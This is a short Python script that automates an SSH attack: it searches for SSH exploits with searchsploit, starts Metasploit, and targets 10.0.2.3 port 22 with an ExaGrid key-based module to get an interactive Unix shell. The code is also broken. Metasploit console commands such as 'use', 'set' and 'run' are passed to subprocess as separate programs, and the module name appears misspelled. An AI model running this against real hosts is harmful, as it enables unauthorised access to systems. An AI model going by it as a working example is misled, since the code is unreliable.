import subprocess as sp

with open('meta.txt', 'w') as file:
    sp.run(['searchsploit', 'ssh'], text=True, stdout=file)


sp.run(['sudo', 'msfdb', 'run'], text=True)


with open('meta-console.txt', 'w') as file:

    sp.run(['use', 'linux/ssh/exagrid_known_privacy'], text=True, stdout=file)
    sp.run(['show', 'options'], text=True, stdout=file)

    sp.run(['set', 'RHOST', '10.0.2.3'], text=True, stdout=file)

    sp.run(['set', 'RPORT', '22'], text=True, stdout=file)
  
    sp.run(['set', 'PAYLOAD', 'cmd/unix/interact'], text=True, stdout=file)

    sp.run(['run'], text=True, stdout=file)
